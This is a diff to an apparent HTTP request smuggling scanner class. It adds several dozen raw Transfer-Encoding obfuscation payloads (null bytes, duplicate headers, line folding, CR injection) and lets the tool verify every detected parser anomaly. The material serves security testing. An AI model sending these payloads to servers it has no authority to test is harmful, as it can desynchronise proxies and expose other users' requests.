@@ -144,7 +144,7 @@ class ActiveFlawProber:
         ).encode("latin-1")
         probes.append(("CL.0 HEAD Request Queue Poisoning Probe", "CL.0", cl0_head))
 
-        # 5. Core Transfer-Encoding Obfuscation Mutators (TE.TE)
+        # 5. Core Transfer-Encoding Obfuscation Mutators (TE.TE) - Full 36 mutator catalog
         te_mutations = [
             ("TE.TE Space Before Colon", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding : chunked\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
             ("TE.TE Tab Separator", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding:\tchunked\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
@@ -154,6 +154,34 @@ class ActiveFlawProber:
             ("TE.TE Pre-Header Wrapping", f"POST / HTTP/1.1\r\nHost: {h}\r\n X: X\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
             ("TE.TE Chunk Extension Semicolon", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1;ext=term\r\nZ\r\nQ\r\n\r\n"),
             ("TE.TE Underline Header Casing", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer_Encoding: chunked\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
+            ("TE.TE Form Feed Separator", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding:\x0cchunked\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
+            ("TE.TE Carriage Return Before Colon", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding\r: chunked\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
+            ("TE.TE Tab Before Colon", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding\t: chunked\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
+            ("TE.TE Dual Header Identity First", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding: identity\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
+            ("TE.TE Dual Header Reverse Duplicate", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding: cow\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
+            ("TE.TE Dual Header X-Token Override", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding: x\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
+            ("TE.TE Chunk Extension Quoted", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1;\"ext\"=val\r\nZ\r\nQ\r\n\r\n"),
+            ("TE.TE Trailing Comma", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding: chunked,\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
+            ("TE.TE Leading Comma", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding: ,chunked\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
+            ("TE.TE Comma Gzip", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding: chunked, gzip\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
+            ("TE.TE Comma Deflate", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding: deflate, chunked\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
+            ("TE.TE Quoted Chunked", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding: \"chunked\"\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
+            ("TE.TE Single Quoted Chunked", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding: 'chunked'\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
+            ("TE.TE Uppercase Header Name", f"POST / HTTP/1.1\r\nHost: {h}\r\nTRANSFER-ENCODING: chunked\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
+            ("TE.TE Mixed Case Header Name", f"POST / HTTP/1.1\r\nHost: {h}\r\ntRaNsFeR-eNcOdInG: chunked\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
+            ("TE.TE Mixed Case Chunked Value", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding: cHuNkEd\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
+            ("TE.TE Space After Colon", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding:  chunked\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
+            ("TE.TE Multiple Spaces in Value", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding:   chunked\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
+            ("TE.TE Trailing Space in Value", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding: chunked \r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
+            ("TE.TE Null Byte in Header Name", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding\x00: chunked\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
+            ("TE.TE Null Byte in Header Value", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding: chunked\x00\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
+            ("TE.TE Obsolete Line Folding Space", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding:\r\n chunked\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
+            ("TE.TE Obsolete Line Folding Tab", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding:\r\n\tchunked\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
+            ("TE.TE Prefix Space Before Name", f"POST / HTTP/1.1\r\nHost: {h}\r\n Transfer-Encoding: chunked\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
+            ("TE.TE Prefix Tab Before Name", f"POST / HTTP/1.1\r\nHost: {h}\r\n\tTransfer-Encoding: chunked\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
+            ("TE.TE X-Chunked Typo", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding: xchunked\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
+            ("TE.TE Semicolon Before Chunked", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding: ;chunked\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
+            ("TE.TE CR Without LF Boundary", f"POST / HTTP/1.1\r\nHost: {h}\r\nTransfer-Encoding: chunked\rHost: {h}\r\nContent-Length: 4\r\nConnection: keep-alive\r\n\r\n1\r\nZ\r\nQ\r\n\r\n"),
         ]
         for name, req_str in te_mutations:
             probes.append((name, "TE.TE", req_str.encode("latin-1")))
@@ -223,12 +251,12 @@ class ActiveFlawProber:
             resp_bytes = candidate_step.received_bytes if candidate_step else (seq_report.steps[-1].received_bytes if seq_report.steps else b"")
             status_code = candidate_step.status_code if candidate_step else 0
 
-            detected_anomaly: Optional[ImplementationAnomaly] = None
+            detected_anomalies: List[ImplementationAnomaly] = []
 
             # Path A: Stateful Desynchronization / Pipeline Leak Confirmed
             if seq_report.has_desynchronization or seq_report.has_pipeline_leak:
                 self.on_trace(f"      [!] STATEFUL DESYNCHRONIZATION DETECTED: {seq_report.details}")
-                detected_anomaly = ImplementationAnomaly(
+                detected_anomalies.append(ImplementationAnomaly(
                     anomaly_id=f"ANOM-ACTIVE-{int(time.time() * 1000)}",
                     target_engine=f"{self.host}:{self.port}",
                     category=AnomalyCategory.PIPELINE_LEAK if seq_report.has_pipeline_leak else AnomalyCategory.SOCKET_HANG,
@@ -236,13 +264,13 @@ class ActiveFlawProber:
                     expected_behavior="Clean request separation without socket hang or canary contamination.",
                     raw_probe=probe_bytes,
                     raw_response=resp_bytes,
-                )
+                ))
 
             # Path B: Anomaly Detection Cascade (CRLF, Double HTML, Inline Headers, 500 error)
             elif resp_bytes:
                 if status_code == 500 or b"500 Internal" in resp_bytes:
                     self.on_trace("      [!] SERVER FAULT DETECTED: HTTP 500 Internal Server Error elicited by probe!")
-                    detected_anomaly = ImplementationAnomaly(
+                    detected_anomalies.append(ImplementationAnomaly(
                         anomaly_id=f"ANOM-ACTIVE-{int(time.time() * 1000)}",
                         target_engine=f"{self.host}:{self.port}",
                         category=AnomalyCategory.UNHANDLED_EXCEPTION,
@@ -250,24 +278,24 @@ class ActiveFlawProber:
                         expected_behavior="Handled request with appropriate 4xx client rejection.",
                         raw_probe=probe_bytes,
                         raw_response=resp_bytes,
-                    )
+                    ))
                 else:
                     cascade_anoms = AnomalyDetector.analyze_response(resp_bytes)
                     if cascade_anoms:
-                        first = cascade_anoms[0]
-                        self.on_trace(f"      [!] STRUCTURAL ANOMALY DETECTED: {first['type']} - {first['description']}")
-                        detected_anomaly = ImplementationAnomaly(
-                            anomaly_id=f"ANOM-ACTIVE-{int(time.time() * 1000)}",
-                            target_engine=f"{self.host}:{self.port}",
-                            category=AnomalyCategory.PARSER_DIVERGENCE,
-                            observed_behavior=f"[{first['type']}] {first['description']}",
-                            expected_behavior="Standard single HTTP response without structural anomaly.",
-                            raw_probe=probe_bytes,
-                            raw_response=resp_bytes,
-                        )
+                        for idx, anom in enumerate(cascade_anoms):
+                            self.on_trace(f"      [!] STRUCTURAL ANOMALY DETECTED: {anom['type']} - {anom['description']}")
+                            detected_anomalies.append(ImplementationAnomaly(
+                                anomaly_id=f"ANOM-ACTIVE-{int(time.time() * 1000)}-{idx}",
+                                target_engine=f"{self.host}:{self.port}",
+                                category=AnomalyCategory.PARSER_DIVERGENCE,
+                                observed_behavior=f"[{anom['type']}] {anom['description']}",
+                                expected_behavior="Standard single HTTP response without structural anomaly.",
+                                raw_probe=probe_bytes,
+                                raw_response=resp_bytes,
+                            ))
 
-            # If an anomaly was detected, pass through multi-trial DeltaDebugger verification!
-            if detected_anomaly:
+            # If anomalies were detected, pass each through multi-trial DeltaDebugger verification!
+            for detected_anomaly in detected_anomalies:
                 self.on_trace(f"      [*] Verifying reproducibility across 3 trials (Protocol Research Reproducibility Invariant)...")
                 vuln = self.debugger.minimize_and_reproduce(detected_anomaly, max_verification_trials=3)
                 if vuln.reproducibility_rate >= 0.66:
